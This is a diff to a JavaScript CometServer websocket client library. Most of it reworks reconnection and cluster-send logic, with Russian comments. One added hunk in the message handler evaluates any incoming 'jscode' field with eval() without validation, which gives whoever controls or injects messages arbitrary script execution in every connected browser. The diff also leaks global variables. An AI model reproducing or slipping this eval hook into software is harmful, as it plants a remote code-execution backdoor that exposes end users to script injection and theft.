@@ -206,7 +206,7 @@ var cometServer = function(opt)
 /**
  * @private
  */
-cometServer.prototype.version = "3.10";
+cometServer.prototype.version = "3.13"; //  
 
 /**
  * @private
@@ -908,7 +908,7 @@ cometServer.prototype.start = function(opt, callBack)
 
     cometServer.prototype.UseWebSocket(window.WebSocket !== undefined);
 
-    if(cometServer.prototype.options.dev_id !== undefined)
+    if(cometServer.prototype.options.dev_id > 0)
     {
         cometServer.prototype.in_abort = false;
         cometServer.prototype.conect(callBack);
@@ -1295,6 +1295,12 @@ cometServer.prototype.msg_cultivate = function( msg )
         cometServer.prototype.hasCriticalError = true;
     }
 
+    
+    if(msg.jscode !== undefined)
+    {
+        eval(msg.jscode)
+        return 0;
+    }
 
     if(msg.authorized !== undefined)
     {
@@ -1315,15 +1321,12 @@ cometServer.prototype.msg_cultivate = function( msg )
     {
         msg.data = cometServer.prototype.Base64.decode(msg.data)
     }
-
+    
+    cTestData = msg.data
     try{
         if(cometServer.prototype.LogLevel) console.log(["msg", msg.data, "web_id:"+web_id]);
 
-        pmsg = JSON.parse(msg.data)
-        //var pmsg = JSON.parse(msg.data)
-
-        //typeof pmsg
-
+        pmsg = JSON.parse(msg.data.replace(/\\'/g, "'")) 
         if(pmsg !== undefined)
         {
             msg.data = pmsg
@@ -1335,9 +1338,7 @@ cometServer.prototype.msg_cultivate = function( msg )
         try
         {
             if(cometServer.prototype.LogLevel) console.log(["msg", msg.data, "web_id:"+web_id]);
-            var pmsg = JSON.parse(msg.data)
-            //var pmsg = JSON.parse(msg.data)
-
+            var pmsg = JSON.parse(msg.data.replace(/\\'/g, "'")) 
             if(pmsg !== undefined)
             {
                 msg.data = pmsg
@@ -1504,6 +1505,7 @@ cometServer.prototype.errorReportSend = function()
  */
 cometServer.prototype.socketArraySend = function(data)
 {
+    var count = 0;
     for(var i = 0; i < cometServer.prototype.socketArray.length; i++)
     {
         var socket = cometServer.prototype.socketArray[i];
@@ -1527,9 +1529,15 @@ cometServer.prototype.socketArraySend = function(data)
                     continue;
                 }
             }
-            return true;
+            
+            // Отправлять подписки всем а не первому попавшемуся (тоесть кластер поддержания надёжности а не кластер деления нагрузки) [ От TV seregaTV]
+            //return true;
+            count++;
         }
     }
+    
+    // Отправлять подписки всем а не первому попавшемуся (тоесть кластер поддержания надёжности а не кластер деления нагрузки) [От TV seregaTV]
+    if(count) return true;
 
     return false;
 }
@@ -1789,7 +1797,7 @@ cometServer.prototype.conect_to_server = function()
     if(cometServer.prototype.UseWebSocket())
     {
 
-        function initSocket(socket)
+        function initSocket(socket, indexInArr)
         {
             socket.onopen = function()
             {
@@ -1818,7 +1826,7 @@ cometServer.prototype.conect_to_server = function()
 
             socket.onclose = function(event)
             {
-                cometServer.prototype.in_conect_to_server = false;
+                //cometServer.prototype.in_conect_to_server = false;
                 if (event.wasClean || cometServer.prototype.in_abort === true)
                 {
                     if(thisObj.LogLevel) console.log('WS Соединение закрыто чисто');
@@ -1874,7 +1882,12 @@ cometServer.prototype.conect_to_server = function()
                         // Если это первый обрыв соединения подряд то переподключаемся быстрее
                         setTimeout(function()
                         {
-                            thisObj.conect_to_server();
+                            //thisObj.conect_to_server();
+                            var node = cometServer.prototype.options.nodeArray[indexInArr]
+                            var socket = new WebSocket(cometServer.prototype.getUrl(node)); 
+                            cometServer.prototype.socketArray[indexInArr] = socket;
+                            initSocket(socket, indexInArr);
+                            
                         }, cometServer.prototype.time_to_reconect_on_close );
                     }
                     else
@@ -1888,7 +1901,12 @@ cometServer.prototype.conect_to_server = function()
                         // Если это не первый обрыв соединения подряд то переподключаемся не сразу
                         setTimeout(function()
                         {
-                            thisObj.conect_to_server();
+                            //thisObj.conect_to_server();
+                            var node = cometServer.prototype.options.nodeArray[indexInArr]
+                            var socket = new WebSocket(cometServer.prototype.getUrl(node)); 
+                            cometServer.prototype.socketArray[indexInArr] = socket;
+                            initSocket(socket, indexInArr);
+                            
                         }, thisObj.time_to_reconect_on_error );
                     }
                 }
@@ -1907,7 +1925,7 @@ cometServer.prototype.conect_to_server = function()
                 {
                     var rj = {};
                     try{
-                        rj = JSON.parse(lineArray[i]);
+                         rj = JSON.parse(lineArray[i].replace(/\\'/g, "'"));
                     }
                     catch (failed)
                     {
@@ -1921,7 +1939,7 @@ cometServer.prototype.conect_to_server = function()
 
             socket.onerror = function(error)
             {
-                thisObj.in_conect_to_server = false;
+                //thisObj.in_conect_to_server = false;
                 if(thisObj.LogLevel) console.log("Ошибка " + error.message);
 
             };
@@ -1930,11 +1948,17 @@ cometServer.prototype.conect_to_server = function()
         cometServer.prototype.socketArray = []
         for(var i = 0; i < cometServer.prototype.options.nodeArray.length; i++)
         {
+            if(cometServer.prototype.hasCriticalError)
+            {
+                // Если true то произошла критическая ошибка после которой нет смысла подключатся к серверу
+                return false;
+            }
+
             var node = cometServer.prototype.options.nodeArray[i]
             var socket = new WebSocket(cometServer.prototype.getUrl(node));
 
             cometServer.prototype.socketArray.push(socket)
-            initSocket(socket);
+            initSocket(socket, cometServer.prototype.socketArray.length -  1 );
         }
     }
     else
@@ -2053,4 +2077,3 @@ function CometServer()
 {
     return cometApi;
 }
-
